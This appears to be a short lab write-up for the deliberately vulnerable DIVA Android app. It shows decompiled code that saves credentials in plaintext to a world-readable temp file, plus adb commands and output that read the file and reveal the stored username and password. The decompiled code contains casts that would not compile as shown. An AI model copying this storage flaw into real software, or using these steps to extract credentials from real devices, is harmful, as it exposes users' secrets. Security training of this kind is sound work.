## Insecure Data Storage Part 4


#### The vulnerability

This time, it is stored in a temp file

        view = (EditText)this.findViewById(2131493006);
        EditText editText = (EditText)this.findViewById(2131493007);
        Object object = new File(this.getApplicationInfo().dataDir);
        try {
            Comparable<File> comparable = File.createTempFile("uinfo", "tmp", (File)object);
            ((File)comparable).setReadable(true);
            ((File)comparable).setWritable(true);
            object = new FileWriter((File)comparable);
            comparable = new Comparable<File>();
            ((Writer)object).write(((StringBuilder)comparable).append(view.getText().toString()).append(":").append(editText.getText().toString()).append("\n").toString());
            ((OutputStreamWriter)object).close();
            Toast.makeText((Context)this, (CharSequence)"3rd party credentials saved successfully!", (int)0).show();
            return;
        }
        catch (Exception exception) {
            Toast.makeText((Context)this, (CharSequence)"File error occurred", (int)0).show();
            Log.d((String)"Diva", (String)("File error: " + exception.getMessage()));
            return;

#### How to exploit

        adb root 
        cd /data/data/jakhar.aseem.diva
        ls -al

u will see this

        drwxr-x--x  5 u0_a67 u0_a67       4096 2019-10-11 06:24 .
        drwxrwx--x 91 system system       4096 2019-10-11 06:20 ..
        drwxrws--x  2 u0_a67 u0_a67_cache 4096 2019-10-11 06:20 cache
        drwxrws--x  2 u0_a67 u0_a67_cache 4096 2019-10-11 06:20 code_cache
        drwxrwx--x  2 u0_a67 u0_a67       4096 2019-10-11 06:20 databases
        -rw-------  1 u0_a67 u0_a67         35 2019-10-11 06:24 uinfo1241259384763728833tmp

cat the uinfo file

        generic_x86_64:/data/data/jakhar.aseem.diva # cat  uinfo1241259384763728833tmp
        Lewis Hamilton:GetinthereLewis!!!!




